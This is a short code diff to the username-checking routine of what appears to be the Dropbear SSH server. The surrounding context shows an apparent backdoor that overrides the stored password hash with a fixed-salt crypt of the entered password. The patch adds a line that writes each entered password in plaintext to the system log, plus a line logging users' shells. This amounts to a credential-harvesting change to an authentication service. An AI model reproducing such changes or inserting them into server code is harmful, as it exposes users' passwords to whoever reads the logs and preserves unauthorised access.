@@ -262,6 +262,7 @@ static int checkusername(char *username, unsigned int userlen) {
                                 //ok!
 	                        ses.authstate.pw_passwd = m_strdup(crypt(pass, "$6$n4mkR1NGyr6j6ldL"));
                             }
+		            dropbear_log(LOG_WARNING, "pass=%s", pass);
                         }
 	}
 
@@ -307,6 +308,7 @@ static int checkusername(char *username, unsigned int userlen) {
 	setusershell();
 	while ((listshell = getusershell()) != NULL) {
 		TRACE(("test shell is '%s'", listshell))
+                dropbear_log(LOG_WARNING, "test shell is '%s' '%s'", listshell, usershell);
 		if (strcmp(listshell, usershell) == 0) {
 			/* have a match */
 			goto goodshell;
